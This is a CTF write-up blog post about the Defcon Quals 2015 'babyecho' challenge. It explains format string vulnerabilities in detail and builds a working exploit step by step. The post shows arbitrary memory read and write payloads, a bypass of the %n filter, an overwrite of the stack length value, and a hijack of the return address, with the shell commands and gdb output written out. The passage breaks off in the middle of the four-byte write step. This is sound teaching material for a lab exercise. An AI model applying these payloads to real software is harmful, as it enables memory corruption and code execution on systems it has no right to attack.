---
id: 2059
title: 'Defcon Quals: babyecho (format string vulns in gory detail)'
date: '2015-05-22T13:38:21-05:00'
author: 'Ron Bowes'
layout: post
guid: 'https://blog.skullsecurity.org/?p=2059'
permalink: /2015/defcon-quals-babyecho-format-string-vulns-in-gory-detail
categories:
    - 'Defcon Quals 2015'
---

Welcome to the third (and penultimate) blog post about the 2015 <a href='https://legitbs.net'>Defcon Qualification CTF</a>! This is going to be a writeup of the "babyecho" level, as well as a thorough overview of format-string vulnerabilities! I really like format string vulnerabilities - they're essentially a "read or write anywhere" primitive - so I'm excited to finally write about them!

You can grab the binary <a href='https://blogdata.skullsecurity.org/babyecho'>here</a>, and you can get my exploit and some other files on <a href='https://github.com/iagox86/defcon-quals-2015/tree/master/babyecho'>this Github repo</a>.
<!--more--><style>.in { color: #dc322f; font-weight: bold; }</style>
<h2>How printf works</h2>

Before understanding how a format string vulnerability works, we first have to understand what a format string is. This is a pretty long and detailed section (can you believe I initially wrote "this will be quick" before I got going?), but if you have a decent idea of how the stack and how printf() work, then you can go ahead and skip to the next section.

So... what is a format string exactly? A format string is something you see fairly frequently in code, and looks like this:

<pre id='vimCodeElement'>
printf(<span class="Constant">&quot;The total of </span><span class="Special">%s</span><span class="Constant"> is </span><span class="Special">%d</span><span class="Constant">&quot;</span>, str, num);
</pre>

Essentially, there are a bunch of functions in libc and elsewhere - printf(), sprintf(), and fprintf() to name a few - that require a format string and then 0 or more arguments. In the case of above, the format string is "The total of %s is %d" and the parameters are "str" and "num". The printf() function replaces the %s with the first argument - a pointer to a string - and %d with the second argument - an integer.

To understand how this works, it helps to understand how the stack works. Check out <a href='/2015/defcon-quals-r0pbaby-simple-64-bit-rop'>my post on r0pbaby</a> if you want more general information on stacks (this is going to be targeted specifically at how printf() uses it).

Let's jump right in and look at what the assembly version of that code snippit might look like:

<pre id='vimCodeElement'>
<span class="Identifier">push</span> <span class="Identifier">num</span>
<span class="Identifier">push</span> <span class="Identifier">str</span>
<span class="Identifier">push</span> &quot;<span class="Identifier">The</span> <span class="Identifier">total</span> <span class="Identifier">of</span> %<span class="Identifier">s</span> <span class="Identifier">is</span> %<span class="Identifier">d</span>&quot; <span class="Comment">; you can't actually do this in assembly</span>
<span class="Identifier">call</span> <span class="Identifier">printf</span>
<span class="Identifier">add</span> <span class="Identifier">esp</span>, <span class="Constant">0x0c</span>
</pre>

Essentially, this code pushes three arguments onto the stack - the same three arguments that you would pass to printf() in C - for a total of 12 bytes (we're assuming x86 here, but x64 works almost identically). Then it calls printf(). After printf() does its thing and returns, 0x0c (12) is added to the stack - essentially removing the three variables that were pushed (three pushes = 12 bytes onto the stack, subtracting 12 = 12 bytes off the stack).

When printf() starts, it doesn't technically know how many arguments it received. Much like when we discuss <a href='/2015/defcon-quals-r0pbaby-simple-64-bit-rop'>ROP</a> (<a href='https://en.wikipedia.org/wiki/Return-oriented_programming'>return-oriented programming</a>), the important thing is this: when we reach line 1 of printf(), printf() assumes everything is set up properly. It doesn't know how many arguments were passed, and it doesn't know where it was called from - it just knows that it's starting and it's supposed to do its thing, otherwise people will be upset.

So when printf() runs, it grabs the format string from the stack. It looks at how many format specifiers ("%d"/"%s"/etc.) it has, and starts reading them off the stack. It doesn't care if nobody put them there - as far as printf() is concerned, the stack is just a bunch of data, and it can read as far up into the data as it wants (till it hits the end).

So let's say you do this (and I challenge you to find me a C programmer who hasn't at some point):

<pre>
$ cat &gt; test.c

<span class="PreProc">#include </span><span class="Constant">&lt;stdio.h&gt;</span>

<span class="Type">int</span> main(<span class="Type">int</span> argc, <span class="Type">const</span> <span class="Type">char</span> *argv[])
{
  printf(<span class="Constant">&quot;</span><span class="Special">%x</span><span class="Constant"> </span><span class="Special">%x</span><span class="Constant"> </span><span class="Special">%x</span><span class="Special">\n</span><span class="Constant">&quot;</span>);

  <span class="Statement">return</span> <span class="Constant">0</span>;
}
</pre>

Then compile it:

<pre>
$ <span class='in'>make test</span>
cc     test.c   -o test
test.c: In function ‘main’:
test.c:5:3: warning: format ‘%x’ expects a matching ‘unsigned int’ argument [-Wformat]
test.c:5:3: warning: format ‘%x’ expects a matching ‘unsigned int’ argument [-Wformat]
test.c:5:3: warning: format ‘%x’ expects a matching ‘unsigned int’ argument [-Wformat]
</pre>

Notice that gcc complains that you're doing it wrong, but they're only warnings! It's perfectly happy to let you try.

Then run the program and marvel at the results:

<pre>
$ <span class='in'>./test</span>
ffffd9d8 ffffd9e8 40054a
</pre>

Now where the heck did that come from!?

Well, as I already mentioned, we're reading whatever happened to be on the stack! Let's look at it one more way before we move on: we'll use a stack diagram like we did in r0pbaby to explain things.

Let's say you have a function called func_a(). func_a() might look like this:

<pre id='vimCodeElement'>
<span class="Type">int</span> func_a(<span class="Type">int</span> param_b, <span class="Type">int</span> param_c)
{
  <span class="Type">int</span> local_d = <span class="Constant">0x123</span>;
  <span class="Type">char</span> local_e[<span class="Constant">12</span>] = <span class="Constant">&quot;AAAABBBBCCCC&quot;</span>;

  printf(<span class="Constant">&quot;</span><span class="Special">%x</span><span class="Constant"> </span><span class="Special">%x</span><span class="Constant"> </span><span class="Special">%x</span><span class="Constant"> </span><span class="Special">%x</span><span class="Constant"> </span><span class="Special">%x</span><span class="Constant"> </span><span class="Special">%x</span><span class="Constant"> </span><span class="Special">%x</span><span class="Special">\n</span><span class="Constant">&quot;</span>);
}
</pre>

When func_a() is called by another function, in assembly, it'll look like this:

<pre id='vimCodeElement'>
<span class='Comment'>; In C --&gt; func_a(1000, 10);
<span class="Identifier">push</span> <span class="Constant">10</span>
<span class="Identifier">push</span> <span class="Constant">1000</span>
<span class="Identifier">call</span> <span class="Identifier">func_a</span>
<span class="Identifier">add</span> <span class="Identifier">esp</span>, <span class="Constant">8</span>
</pre>

and the stack will look like this immediately after the call to func_a() is made (in other words, when it's on the first line of func_a()):

<pre>
+----------------------+
|...higher addresses...|
+----------------------+
|...data from caller...|
+----------------------+
+----------------------+
|          10          | &lt;-- param_c
+----------------------+
|         1000         | &lt;-- param_b
+----------------------+
|     [return addr]    | &lt;-- esp points here
+----------------------+
+----------------------+
|.....unallocated......|
+----------------------+
|...lower addresses....| &lt;-- other data from previous function
+----------------------+
</pre>

func_a() will look something like this:

<pre id='vimCodeElement'>
<span class="Identifier">func_a</span>:
  <span class="Identifier">push</span> <span class="Identifier">ebp</span>         <span class="Comment">; Back up the old frame pointer</span>
  <span class="Identifier">mov</span> <span class="Identifier">ebp</span>, <span class="Identifier">esp</span>     <span class="Comment">; Create the new frame pointer</span>
  <span class="Identifier">sub</span> <span class="Identifier">esp</span>, <span class="Constant">0x10</span>    <span class="Comment">; Make room for 16 bytes of local vars</span>

  <span class="Identifier">mov</span> [<span class="Identifier">ebp</span>-<span class="Constant">0x04</span>], <span class="Constant">0x123</span> <span class="Comment">; Set a local var to 123</span>
  <span class="Identifier">mov</span> [<span class="Identifier">ebp</span>-<span class="Constant">0x08</span>], <span class="Constant">0x41414141</span> <span class="Comment">; &quot;AAAA&quot;</span>
  <span class="Identifier">mov</span> [<span class="Identifier">ebp</span>-<span class="Constant">0x0c</span>], <span class="Constant">0x42424242</span> <span class="Comment">; &quot;BBBB&quot;</span>
  <span class="Identifier">mov</span> [<span class="Identifier">ebp</span>-<span class="Constant">0x10</span>], <span class="Constant">0x43434343</span> <span class="Comment">; &quot;CCCC&quot;</span>

  <span class="Comment">; format_string would be stored elsewhere, like in .data</span>
  <span class="Identifier">push</span> <span class="Identifier">format_string</span> <span class="Comment">; &quot;%x %x %x %x %x %x %x\n&quot;</span>
  <span class="Identifier">call</span> <span class="Identifier">printf</span>      <span class="Comment">; Call printf</span>
  <span class="Identifier">add</span> <span class="Identifier">esp</span>, <span class="Constant">4</span>       <span class="Comment">; Remove the format string from the stack</span>

  <span class="Identifier">add</span> <span class="Identifier">esp</span>, <span class="Constant">0x10</span>    <span class="Comment">; Get rid of the locals from the stack</span>
  <span class="Identifier">pop</span> <span class="Identifier">ebp</span>          <span class="Comment">; Restore the previous frame pointer</span>
  <span class="Identifier">ret</span>              <span class="Comment">; Return</span>
</pre>

It's important to note: this is assuming a completely naive compilation, which basically never happens. In reality, a few things would change; for example, local_e may be initialized differently (and likely be padded to 0x10 bytes), plus there will probably be some saved registers taking up space. That being said, the principles won't change - you might just have to mess around with addresses and experiment with the function.

Looking at that code, you might see that the start and the end of the function are more or less mirrors of each other. It starts by saving ebp and making room on the stack, and ends with getting rid of the room and restoring the saved ebp.

What's important, though, is what the stack looks like at the moment we call printf(). This is it:

<pre>
+----------------------+
|...higher addresses...|
+----------------------+
|...data from caller...|
+----------------------+
+----------------------+
|          10          | &lt;-- param_c
+----------------------+
|         1000         | &lt;-- param_b
+----------------------+
|     [return addr]    |
+----------------------+
|      [saved ebp]     | &lt;-- From the "push ebp"
+----------------------+
|       0x123          | &lt;-- local_d
+----------------------+
|        CCCC          |
|        BBBB          | &lt;-- local_e (12 bytes)
|        AAAA          |        (remember, higher addresses are upwards)
+----------------------+
+----------------------+
|    format_string     | &lt;-- format string was pushed onto the stack
+----------------------+ &lt;-- esp points here
|.....unallocated......|
+----------------------+
|...lower addresses....| <-- other data from previous function
+----------------------+
</pre>

When printf() is called, its return address is pushed onto the stack, and it does whatever it needs to do with its own local variables. But here's the kicker: <em>it thinks it has arguments on the stack</em>! Here's printf()'s view of the function:

<pre>
+----------------------+
|...higher addresses...|
+----------------------+
|...data from caller...|
+----------------------+
+----------------------+
|          10          |
+----------------------+
|         1000         | &lt;-- seventh format parameter
+----------------------+
|     [return addr]    | &lt;-- sixth format parameter
+----------------------+
|      [saved ebp]     | &lt;-- fifth format parameter
+----------------------+
|       0x123          | &lt;-- fourth format parameter
+----------------------+
|        CCCC          | &lt;-- third format parameter
|        BBBB          | &lt;-- second format parameter
|        AAAA          | &lt;-- first format parameter
+----------------------+
+----------------------+
|    format_string     | &lt;-- format string was pushed onto the stack
+----------------------+
|     [return addr]    | &lt;-- printf's return address
+----------------------+ &lt;-- esp points somewhere down here
|...lower addresses....| <-- other data from previous function
+----------------------+
</pre>

So what's printf going to do? It's going to print "0x41414141" ("AAAA"), then "0x42424242" ("BBBB"), then "0x43434343" ("CCCC"), then "0x123", then the saved ebp value, then the return address, then "0x3e8" (1000).

Why's printf() doing that? Because it doesn't know any better. You told it (in the format string) that it has arguments, so it thinks it has arguments!

Just for fun, I decided to try running the program to see how close I was:

<pre>
$ cat &gt; test.c
<span class="PreProc">#include </span><span class="Constant">&lt;stdio.h&gt;</span>

<span class="Type">int</span> func_a(<span class="Type">int</span> param_b, <span class="Type">int</span> param_c)
{
  <span class="Type">int</span> local_d = <span class="Constant">0x123</span>;
  <span class="Type">char</span> local_e[<span class="Constant">12</span>] = <span class="Constant">&quot;AAAABBBBCCCC&quot;</span>;

  printf(<span class="Constant">&quot;</span><span class="Special">%x</span><span class="Constant"> </span><span class="Special">%x</span><span class="Constant"> </span><span class="Special">%x</span><span class="Constant"> </span><span class="Special">%x</span><span class="Constant"> </span><span class="Special">%x</span><span class="Constant"> </span><span class="Special">%x</span><span class="Constant"> </span><span class="Special">%x</span><span class="Special">\n</span><span class="Constant">&quot;</span>);
}

<span class="Type">int</span> main(<span class="Type">int</span> argc, <span class="Type">const</span> <span class="Type">char</span> *argv[])
{
  func_a(<span class="Constant">1000</span>, <span class="Constant">10</span>);

  <span class="Statement">return</span> <span class="Constant">0</span>;
}
$ <span class='in'>make test</span>
cc test.c   -o test
$ <span class='in'>./test</span>
80495e4 fffffc68 80482c8 41414141 42424242 43434343 123
</pre>

End result: I was closer than I thought I'd be! There are three pointers (it looks like two pointers within the binary and one from the stack, if I had to guess) that come from who-knows-where, but the rest is there. I added five more "%x"s to the string to see if we could get the parameters:

<pre>
$ <span class='in'>./test</span>
80495f8 fffffc68 80482c8 41414141 42424242 43434343 123 b7fcc304 b7fcbff4 fffffc98 8048412 3e8 a
</pre>

There we go! We can see 0x3e8 (the first parameter, 1000), 0xa (the second parameter, 10), then 0x8048412 (which will be the return address) and 0xfffffc98 (which will be the saved ebp value). The two unknown values after (0xb7fcbff4 and 0xb7fcc304) are likely saved registers, which I confirmed with objdump:

<pre>
$ <span class='in'>objdump -D -M intel test</span>
[...]
  <span class="Constant">40054a</span>:       <span class="Constant">55</span>                      <span class="Identifier">push</span>   <span class="Identifier">rbp</span>
  <span class="Constant">40054b</span>:       <span class="Constant">48 89 e5</span>                <span class="Identifier">mov</span>    <span class="Identifier">rbp</span>,<span class="Identifier">rsp</span>
  <span class="Constant">40054e</span>:       <span class="Constant">48 83 ec 20</span>             <span class="Identifier">sub</span>    <span class="Identifier">rsp</span>,<span class="Constant">0x20</span>
  <span class="Constant">400552</span>:       <span class="Constant">89 7d ec</span>                <span class="Identifier">mov</span>    <span class="Identifier">DWORD</span> <span class="Identifier">PTR</span> [<span class="Identifier">rbp</span>-<span class="Constant">0x14</span>],<span class="Identifier">edi</span>
  <span class="Constant">400555</span>:       <span class="Constant">89 75 e8</span>                <span class="Identifier">mov</span>    <span class="Identifier">DWORD</span> <span class="Identifier">PTR</span> [<span class="Identifier">rbp</span>-<span class="Constant">0x18</span>],<span class="Identifier">esi</span>
  <span class="Constant">400558</span>:       <span class="Constant">c7 45 fc 23 01 00 00 </span>   <span class="Identifier">mov</span>    <span class="Identifier">DWORD</span> <span class="Identifier">PTR</span> [<span class="Identifier">rbp</span>-<span class="Constant">0x4</span>],<span class="Constant">0x123</span>
[...]
</pre>

<h2>printf() - the important bits</h2>

We've seen how to read off the stack with a format-string vulnerability. What else can we do? At this point, we'll switch to the <a href='https://blogdata.skullsecurity.org/babyecho'>binary from the game</a> for the remainder of the testing.

The game binary is really easy.. it's a pretty standard format string vulnerability:

<pre>
$ <span class='in'>./babyecho</span>
Reading 13 bytes
<span class='in'>hello</span>
hello
Reading 13 bytes
<span class='in'>%x</span>
d
Reading 13 bytes
<span class='in'>%x %x %x</span>
d a 0
Reading 13 bytes
<span class='in'>%x%x%x%x %x</span>
da0d fffff87c
</pre>

Basically, it's doing printf(attacker_str) - simple, but a vulnerability. The right way to do it is printf("%s", atatcker_str) - that way, attacker_str won't be mistaken for a format string.

The first important bit is that, with just that simple mistake in development, we can crash the binary:

<pre>
$ <span class='in'>./babyecho</span>
Reading 13 bytes
<span class='in'>%s</span>
Segmentation fault (core dumped)
</pre>

And we can read strings:

<pre>
Reading 13 bytes
<span class='in'>%x%x%x%x %x</span>
da0d fffff87c
$ <span class='in'>./babyecho</span>
Reading 13 bytes
<span class='in'>%x%x%x%x %s</span>
da0d %x%x%x%x %s
</pre>

...confusingly, the string at 0xfffff87c was a pointer to the format string itself.

And, with %n, we can crash another way:

<pre>
Reading 13 bytes
<span class='in'>%x%x%x%x %n</span>
da0d _n
</pre>

...or can we? It looks like the level filtered out %n! But, of course, we can get around that if we want to:

<pre>
$ <span class='in'>./babyecho</span>
Reading 13 bytes
<span class='in'>%n</span>
_n
Reading 13 bytes
<span class='in'>%hn</span>
Segmentation fault (core dumped)
</pre>

So we have that in our pocket if we need it. Let's talk about %n for a minute...

<h2>%n? Who uses that?</h2>

If you're a developer, you've most likely seen and used %d and %s. You've probably also seen %x and %p. But have you ever heard of %n?

As far as I can tell, %n was added to printf() specifically to make it possible to exploit format string vulnerabilities. I don't see any other use for it, really.

%n calculates the number of bytes printf() has output so far, and writes it to the appropriate variable. In other words, this:

<pre>
<span class="Type">int</span> a;
printf(<span class="Constant">&quot;</span><span class="Special">%n</span><span class="Constant">&quot;</span>, &amp;a);
</pre>

will write 0 to the variable a, because nothing has been output. This code:

<pre id='vimCodeElement'>
<span class="Type">int</span> a;
printf(<span class="Constant">&quot;AAAA</span><span class="Special">%n</span><span class="Constant">&quot;</span>, &amp;a);
</pre>

will write 4 to the variable a. And this:

<pre id='vimCodeElement'>
printf(<span class="Constant">&quot;</span><span class="Special">%100x%n</span><span class="Constant">&quot;</span>);
</pre>

will write the number 100 (%100x outputs a 100-byte hex number whose value is whatever happens to be next on the stack) to <em>the address that happens to be second on the stack</em> (right after the format string). If it's a valid address, it writes to that memory address. If it's an invalid address, it crashes.

Guess what? That's basically an arbitrary memory write. We'll see more later!

<h2>Cramming bytes in</h2>

Now, let's talk about how we're only allowed 13 bytes for the challenge ("Reading 13 bytes"). 13 bytes isn't enough to do a proper format string exploit in many cases (sometimes it is!). To do a proper exploit, you need to be able to provide an address (4 bytes on 32-bit), %NNx to waste bytes (4-5 more bytes), and then %N$n (another 4-5 bytes). That's a total of 12 bytes in the best case. And, for reasons that'll become abundantly clear, you have to do it four times.

That means we need a way to input longer strings! Thankfully, a 13-byte format string IS long enough to write a single byte to anywhere in memory. We'll do that in the next section, but first I want to introduce another printf() feature that was probably designed for hackers: %123$x.

%123$x means "read the 123rd argument". The idea is that this is inefficient:

<pre id='vimCodeElement'>
printf(<span class="Constant">&quot;The value is </span><span class="Special">%d</span><span class="Constant"> [0x</span><span class="Special">%02x</span><span class="Constant">]</span><span class="Special">\n</span><span class="Constant">&quot;</span>, value, value);
</pre>

so instead, you can save 4 bytes of stack memory (otherwise known as approximately 0.0000000125% of my total memory) and a push operation (somewhere around 1 clock cycle on my 3.2mhz machine) by making everything a little more confusing:

<pre id='vimCodeElement'>
printf(<span class="Constant">&quot;The value is </span><span class="Special">%d</span><span class="Constant"> [0x</span><span class="Special">%1$02x</span><span class="Constant">]</span><span class="Special">\n</span><span class="Constant">&quot;</span>, value);
</pre>

Seriously, that actually works. You can try it!

The cool thing about that is instead of only being able to access six stack elements ("%x%x%x%x%x%x%"), we can read any variable on the stack! Check out how much space it saves:

<pre>
Reading 13 bytes
<span class='in'>%x%x%x%x %x</span>
da0d ffffc69c
Reading 13 bytes
<span class='in'>%5$x</span>
ffffc69c
</pre>

<h2>Starting to build the exploit</h2>

Let's write a quick bash script to print off %1$x, %2$x, %3$x, ...etc:

<pre>
$ <span class='in'>for i in `seq 1 200`; do echo -e "$i:0x%$i\$x" | ./babyecho; done | grep -v Reading | grep -v '0x0$'</span>
1:0xd
2:0xa
4:0xd
5:0xffffc69c
7:0x78303a37
8:0x78243825
135:0xffffc98c
136:0x8048034
138:0x80924d1
139:0x80704fd
140:0xffffc90a
154:0x80ea570
155:0x18
157:0x2710
158:0x14
159:0x3
160:0x28
161:0x3
163:0x38
165:0x5b
167:0x6e
169:0x77
171:0x7c
175:0x80ea540
...
</pre>

If you run it a second time and any values change, be sure you <a href='https://stackoverflow.com/questions/5194666/disable-randomization-of-memory-addresses'>turn off ASLR</a>. It's totally possible to write an exploit for this challenge that assumes ASLR is on, but it's easier to explain one thing at a time. :)

<h2>Arbitrary memory read</h2>

The values at offset 7 and 8 are actually interesting.. let's take a quick look at them:

<pre>
$ <span class='in'>./babyecho</span>
Reading 13 bytes
<span class='in'>%7$x</span>
78243725
</pre>

What's going on here?

It's printing the hex number 0x78243725, which is the 7th thing on the stack. Since it's <a href="https://en.wikipedia.org/wiki/Endianness">little endian</a>, that's actually "25 37 24 78" in memory, which, if you know your ASCII, is "%7$x". That looks a bit familiar, eh? The first 4 bytes of the string?

Let's try making the first 4 bytes of the string something more recognizable:

<pre>
$ <span class='in'>./babyecho</span>
Reading 13 bytes
<span class='in'>AAAA -&gt; %7$x</span>
AAAA -&gt; 41414141
Reading 13 bytes
<span class='in'>ABCD -&gt; %7$x</span>
ABCD -&gt; 44434241
</pre>

So it's printing the first 4 bytes of <em>itself</em>! That's extremely important, because if we now change %...x to %...s, we get:

<pre>
$ <span class='in'>ulimit -c unlimited</span>
$ <span class='in'>echo -e 'AAAA%7$s' | ./babyecho</span>

Reading 13 bytes
Segmentation fault (core dumped)
</pre>

...a crash! And if we investigate the crash:

<pre>
$ <span class='in'>gdb -q ./babyecho ./core</span>
Core was generated by `./babyecho'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x0807f134 in ?? ()
(gdb) <span class='in'>x/i $eip</span>
=> 0x807f134:   repnz scas al,BYTE PTR es:[edi]
(gdb) <span class='in'>print/x $edi</span>
$1 = 0x41414141
</pre>

We determine that it crashed while trying to read edi, which is 0x41414141. And we can use any address we want - for example, I grabbed a random string from IDA - 0x080C1B94 - so let's encode that in little endian and use it:

<pre>
$ <span class='in'>echo -e '\x94\x1b\x0c\x08%7$s' | ./babyecho</span>
Reading 13 bytes
../sysdeps/unix/sysv/linux/getcwd.c
</pre>

It prints out the string! If I really want to, I can chain together a few:

<pre>
$ <span class='in'>echo -e '\x06\x1d\x0c\x08%7$s\n\x1f\x1d\x0c\x08%7$s\n' | ./babyecho</span>
Reading 13 bytes
buffer overflow detected
Reading 13 bytes
stack smashing detected
</pre>

It didn't really detect any of those, of course - I'm just printing out those strings for fun :)

<h2>Arbitrary memory write</h2>

That's an arbitrary memory read. And as a side effect, we've also bypassed ASLR if that's applicable (in this level, it's not really).

Now let's go back to our code that tried to read 0x41414141 ("AAAA%7$s") and change the %..s to a %..n:

<pre>
$ <span class='in'>ulimit -c unlimited</span>
$ <span class='in'>echo -e 'AAAA%7$n' | ./babyecho</span>
Reading 13 bytes
Segmentation fault (core dumped)
</pre>

no surprise there.. let's see what happened:

<pre>
$ <span class='in'>gdb -q ./babyecho ./core</span>
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x08080c2a in ?? ()
(gdb) <span class='in'>x/i $eip</span>
=> 0x8080c2a:   mov    DWORD PTR [eax],ecx
(gdb) <span class='in'>print/x $eax</span>
$1 = 0x41414141
(gdb) <span class='in'>print/x $ecx</span>
$2 = 0x4
</pre>

So it crashed while trying to write 0x4 - a value we sort of control - into 0x41414141 - a value we totally control.

Of course, writing the value 0x4 every time is boring, but we can change to anything - let's try to make it 0x80:

<pre>
$ <span class='in'>echo -e 'AAAA%124x%7$n' | ./babyecho</span>
Reading 13 bytes
AAAA                                                                                                                           d%
Reading 13 bytes

Reading 13 bytes
</pre>

Uh oh! What happened?

Unfortunately, that string is one byte too long, which means the %n isn't getting hit. We need to deal with this pesky length problem!

<h2>Making it longer</h2>

The maximum length for the string is 13 - 0x0d - bytes. Presumably that value is stored on the stack somewhere, and it is:

<pre>
$ <span class='in'>for i in `seq 1 2000`; do echo -e "$i:0x%$i\$x" | ./babyecho; done | grep ":0xd$"</span>
1:0xd
4:0xd
246:0xd
385:0xd
</pre>

The problem is, to write that, we need an absolute address. "AAAA%7$n" writes to the address "AAAA", but we need to know which address those 0xd's live at.

There are a lot of different ways to do this, but none of them are particularly nice. One of the easiest ways is to use one of those corefiles from earlier, grab the 'esp' register (the stack pointer), and read upwards from esp till we hit the top of the stack.

The most recent corefile was caused by trying to write to 0x41414141, which is just fine. We're going to basically read everything on the stack at the time it crashed (somewhere in printf()):

<pre>
(gdb) <span class='in'>x/i $eip</span>
=&gt; 0x8080c2a:   mov    DWORD PTR [eax],ecx
(gdb) <span class='in'>print/x $esp</span>
$2 = 0xffff9420
(gdb) <span class='in'>x/10000xw $esp</span>
0xffff9420:     0xffff94b0      0x00000000      0x0000001c      0x00000000
0xffff9430:     0x00000000      0x00000000      0x00000000      0x00000000
0xffff9440:     <span class='in'>0x0000000d</span>      0x00000000      0x00000000      0x0000000a
...
0xffff9460:     0x00000000      <span class='in'>0x0000000d</span>      0x00000000      0x00000000
...
0xffffc690:     <span class='in'>0x0000000d</span>      0xffffc69c      0x00000000      0x41414141
0xffffc680:     0xffffc69c      <span class='in'>0x0000000d</span>      0x0000000a      0x00000000
...
0xffffca50:     0x00000028      0x00000007      <span class='in'>0x0000000d</span>      0x00008000
0xffffdff0:     0x65796261      0x006f6863      0x00000000      0x00000000
0xffffe000:     Cannot access memory at address 0xffffe000
</pre>

So we have five instances of 0x0000000d:
<ul>
  <li>0xffff9440</li>
  <li>0xffff9464</li>
  <li>0xffffc684</li>
  <li>0xffffc690</li>
  <li>0xffffca58</li>
</ul>

We try modifying each of them using our %n arbitrary write to see what happens:

<pre>
$ <span class='in'>echo -e '\x40\x94\xff\xff%7$n' | ./babyecho</span>
Reading 13 bytes
....
Reading 13 bytes
</pre>

<pre>
$ <span class='in'>echo -e '\x64\x94\xff\xff%7$n' | ./babyecho</span>
Reading 13 bytes
....
Reading 13 bytes
</pre>

<pre>
$ <span class='in'>echo -e '\x84\xc6\xff\xff%7$n' | ./babyecho</span>
Reading 13 bytes
....
Reading 13 bytes
</pre>

<pre>
$ <span class='in'>echo -e '\x90\xc6\xff\xff%7$n' | ./babyecho</span>
Reading 13 bytes
....
Reading 4 bytes
</pre>

Aha! We were able to overwrite the length value with the integer 4. Obviously we don't want 4, but because of the 13-byte limit the best we can do is 99 more:

<pre>
$ <span class='in'>echo -e '\x90\xc6\xff\xff%99x%7$n' | ./babyecho</span>
Reading 13 bytes
....                                                                                                  d
Reading 103 bytes
</pre>

or is it? We can actually mess with a different byte. In other words, instead of changing the last byte - 0x000000xx - we change the second last - 0x0000xx00 - which will be at the next address:

<pre>
$ <span class='in'>echo -e '\x91\xc6\xff\xff%99x%7$n' | ./babyecho</span>
Reading 13 bytes
....                                                                                                  d
Reading 1023 bytes
</pre>

1023 bytes is pretty good! That's plenty of room to build a full exploit.

<h2>Controlling eip</h2>

The next step is to control eip - the instruction pointer, or the thing that says which instruction needs to run. Once we control eip, we can point it at some shellcode (code that gives us full control).

The easiest way to control eip is to overwrite a return address. As we learned somewhere wayyyyyyy up there, return addresses are stored on the stack the same way the length value was stored. And we can find it the same way - just go to where it crashed and find it.

We'll use the same ol' value to crash it:

<pre>
$ <span class='in'>ulimit -c unlimited</span>
$ <span class='in'>echo -e 'AAAA%7$n' | ./babyecho</span>
Reading 13 bytes
Segmentation fault (core dumped)
$ <span class='in'>gdb ./babyecho ./core</span>
...
(gdb) <span class='in'>bt</span>
#0  0x08080c2a in ?? ()
#1  0x08081bb0 in ?? ()
#2  0x0807d285 in ?? ()
#3  0x0804f580 in ?? ()
#4  0x08049014 in ?? ()
#5  0x0804921a in ?? ()
#6  0x08048d2b in ?? ()
</pre>

"bt" - or "backtrace" - prints the list of functions that were called to get to where you are. The call stack. If we can find any of those values on the stack, we can overwrite it and win. I arbitrarily chose 0x08081bb0 and found it at 0xffffa054, but it didn't work. Rather than spend a bunch of time troubleshooting, I found 0x0807d285 instead:

<pre>
(gdb) <span class='in'>x/10000xw $esp</span>
0xffff9420:     0xffff94b0      0x00000000      0x0000001c      0x00000000
0xffff9430:     0x00000000      0x00000000      0x00000000      0x00000000
0xffff9440:     0x0000000d      0x00000000      0x00000000      0x0000000a
...
0xffffc140:     0x080ea200      0x080ea00c      0xffffc658      <span class='in'>0x0807d285</span>
</pre>

It's stored at 0xffffc14c. Let's try changing it to something else:

<pre>
$ <span class='in'>echo -e '\x4c\xc1\xff\xff%7$n' | ./babyecho</span>
Reading 13 bytes
....Segmentation fault (core dumped)
$ <span class='in'>gdb -q ./babyecho ./core</span>
Core was generated by `./babyecho'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x00000004 in ?? ()
</pre>

We overwrote the return address with 4, just like we'd expect! Let's chain together the two exploits - the one for changing the length and the one for changing the return address (I'm quoting the strings separately to make it more clear, but bash will automatically combine them):

<pre>
$ <span class='in'>echo -e '\x91\xc6\xff\xff%99x%7$n\n''\x4c\xc1\xff\xff%10000x%7$n' | ./babyecho</span>
Reading 13 bytes
....                                                                                                  d
Reading 1023 bytes
L...
[...lots of empty space...]
3ffSegmentation fault (core dumped)

$ <span class='in'>gdb -q ./babyecho ./core</span>
Core was generated by `./babyecho'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x00002714 in ?? ()
</pre>

0x2714 = 10004 - so we can definitely control the return address!

<h2>Writing four bytes</h2>

When we're running it locally, we can also go a little crazy:

<pre>
$ <span class='in'>echo -e '\x91\xc6\xff\xff%99x%7$n\n''\x4c\xc1\xff\xff%1094795581x%7$n' | ./babyecho &gt; /dev/null</span>
segmentation fault
$ <span class='in'>gdb -q ./babyecho ./core</span>
Core was generated by `./babyecho'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x41414141 in ?? ()
</pre>

We use %1094795581x to write 0x4141413d bytes to stdout, then %7$n writes 0x41414141 to the return address. The problem is, if we were running that over the network, we'd have to wait for them to send us 1,094,795,581 or so bytes, which is around a gigabyte, so that's probably not going to happen. :)

What we need is to provide four separate addresses. We've been using %7$n all along to access the address identified by the first four bytes of the string:

<pre>
"AAAA%7$n"
</pre>

But we can actually do multiple addresses:

<pre>
"AAAABBBBCCCCDDDD%7$n%8$n%9$n%10$n"
</pre>

That will try writing to the 7th thing on the stack - 0x41414141. If that succeeds, it'll write to the 8th thing - 0x42424242 - and so on. We can prove that by using %..x instead of %..n:

<pre>
$ <span class='in'>echo -e '\x91\xc6\xff\xff%99x%7$n\n''AAAABBBBCCCCDDDD &lt;&lt; %7$x * %8$x * %9$x * %10$x &gt;&gt;' | ./babyecho</span>
Reading 13 bytes
....                                                                                                  d
Reading 1023 bytes
AAAABBBBCCCCDDDD &lt;&lt; 41414141 * 42424242 * 43434343 * 44444444 &gt;&gt;
</pre>

As expected, the 7th, 8th, 9th, and 10th values on the stack were "AAAA", "BBBB", "CCCC", and "DDDD". If that doesn't make sense, go take a look at func_a(), which was one of my first examples, and which put AAAA, BBBB, and CCCC onto the stack.

Now, since we can write to multiple addresses, instead of doing a single gigabyte of writing, we can do either two or four short writes. I'll do four, since that's more commonly seen. That means we're going to do something like this (once again, I'm adding quotes to make it clear what's happening, they'll disappear):

<pre>
'\x4c\xc1\xff\xff''\x4d\xc1\xff\xff''\x4e\xc1\xff\xff''\x4f\xc1\xff\xff''%49x%7$n''%8$n''%9$n''%10$n'
</pre>

Breaking it down:
<ul>
